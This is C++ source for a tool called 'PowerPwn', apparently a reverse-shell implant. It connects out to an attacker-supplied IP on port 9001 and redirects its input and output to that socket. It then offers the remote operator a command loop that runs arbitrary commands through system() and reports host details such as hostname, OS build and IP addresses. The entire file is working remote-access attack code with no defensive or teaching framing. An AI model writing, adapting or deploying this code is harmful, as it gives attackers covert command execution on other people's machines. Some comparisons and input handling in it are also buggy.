#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <csignal>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>

#include <string>

#include "includes/PowerPwn.h"

uint8_t Connection::sd(void) {
    return 0;
}

void get_input(char input[BUFFER]) {
    fgets(input, BUFFER, stdin);
    input[strcspn(input, "\n")] = 0;
}

void Formatting::new_line(void) {
    std::string newline = "\n";
    write(Connection::sd(), newline.data(), newline.length());
}

void Formatting::space(void) {
    std::string space = " ";
    write(Connection::sd(), space.data(), space.length());
}

void Formatting::green(void) {
    std::string green = "\x1b[32m";
    write(Connection::sd(), green.data(), green.length());
}

void Formatting::red(void) {
    std::string red = "\x1b[31m";
    write(Connection::sd(), red.data(), red.length());
}

void Formatting::seperator(void) {
    std::string seperate = "====================================="
        "======================================\n";
    write(Connection::sd(), seperate.data(), seperate.length());
}

void Modules::help(void) {
    struct commands cmd;
    std::string cmds_list = "Commands\n";
    cmd.shell = "shell\n";
    cmd.sysinfo = "sysinfo\n";
    cmd.exit = "exit\n";
    cmd.help = "help\n";

    Formatting::green();
    write(Connection::sd(), cmds_list.data(), cmds_list.length());
    Formatting::seperator();
    write(Connection::sd(), cmd.shell.data(), cmd.shell.length());
    write(Connection::sd(), cmd.sysinfo.data(), cmd.sysinfo.length());
    write(Connection::sd(), cmd.exit.data(), cmd.exit.length());
    write(Connection::sd(), cmd.help.data(), cmd.help.length());
    Formatting::seperator();

}

void Modules::shell(void) {
    std::string shell = "\x1b[31m(PowerPwn: Shell) > ";
    std::string exe = "\x1b[32mExecuting /bin/sh\n";
    std::string exits = "Type exit to return to PowerPwn.\n";
    char option[BUFFER];
    const char *errors = " 2>&0";

    write(Connection::sd(), exe.data(), exe.length());
    write(Connection::sd(), exits.data(), exits.length());

    for (;;) {
        write(Connection::sd(), shell.data(), shell.length());
        Formatting::green();
        get_input(option);

        if (strncmp(option, "exit\0", 5) == 0) {
            break;
        } else {
            strncat(option, errors, BUFFER);
            system(option);
        }
    }
}

void Modules::sysinfo(void) {
    struct utsname utsinfo;
    uname(&utsinfo);

    std::string sysname = utsinfo.sysname;
    std::string nodename = utsinfo.nodename;
    std::string release = utsinfo.release;
    std::string version = utsinfo.version;
    std::string machine = utsinfo.machine;
    std::string domainname = utsinfo.domainname;
    std::string systems = "OS: ";
    std::string hostname = "Hostname: ";
    std::string build = "Build: ";
    std::string date = "Date: ";
    std::string arch= "Arch: ";
    std::string domain_name = "Domain Name: ";
    std::string ip = "IP: ";

    Formatting::seperator();
    write(Connection::sd(), systems.data(), systems.length());
    write(Connection::sd(), sysname.data(), sysname.length());
    Formatting::new_line();
    write(Connection::sd(), hostname.data(), hostname.length());
    write(Connection::sd(), nodename.data(), nodename.length());
    Formatting::new_line();
    write(Connection::sd(), build.data(), build.length());
    write(Connection::sd(), release.data(), release.length());
    Formatting::new_line();
    write(Connection::sd(), date.data(), date.length());
    write(Connection::sd(), version.data(), version.length());
    Formatting::new_line();
    write(Connection::sd(), arch.data(), arch.length());
    write(Connection::sd(), machine.data(), machine.length());
    Formatting::new_line();
    write(Connection::sd(), domain_name.data(), domain_name.length());
    write(Connection::sd(), domainname.data(), domainname.length());
    Formatting::new_line();
    write(Connection::sd(), ip.data(), ip.length());
    system("hostname -I");
    Formatting::seperator();
}

int options(char *option, struct commands *cmd) {
    get_input(option);

    cmd->shell = "shell";
    cmd->sysinfo = "sysinfo";
    cmd->exit = "exit";
    cmd->help = "help";

    if (option == cmd->exit)
        return 1;
    else if (option == cmd->help)
        Modules::help();
    else if (option == cmd->shell)
        Modules::shell();
    else if (option == cmd->sysinfo)
        Modules::sysinfo();

    return 0;
}

void main_loop(void) {
    struct commands *cmd = NULL;
    std::string powerpwn = "(PowerPwn) > ";
    char *option = NULL;
    option = (char*)malloc(BUFFER);
    cmd = (commands*)malloc(sizeof(struct commands));

    do {
        Formatting::red();
        write(Connection::sd(), powerpwn.data(), powerpwn.length());
        Formatting::green();
    } while (options(option, cmd) != 1);

    free(option);
    option = NULL;
    free(cmd);
    cmd = NULL;
}

void Connection::create_connection(char ip[CMDLINE_BUFFER]) {
    uint16_t port = 9001;
    const int sock = socket(AF_INET, SOCK_STREAM, 0);;
    struct sockaddr_in address;

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(ip);
    address.sin_port = htons(port);
    connect(sock, (struct sockaddr *)&address, sizeof(address));
    dup2(sock, sd());
    dup2(sock, 1);
}

int main(int argc, char **argv) {
    struct sigaction sa;

    if (argc < 1)
        return 1;

    memset(&sa, '\0', sizeof(sa));
    sa.sa_sigaction = (void (*)(int, siginfo_t *, void *))&exit;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    Connection::create_connection(argv[1]);
    main_loop();

    return 0;
}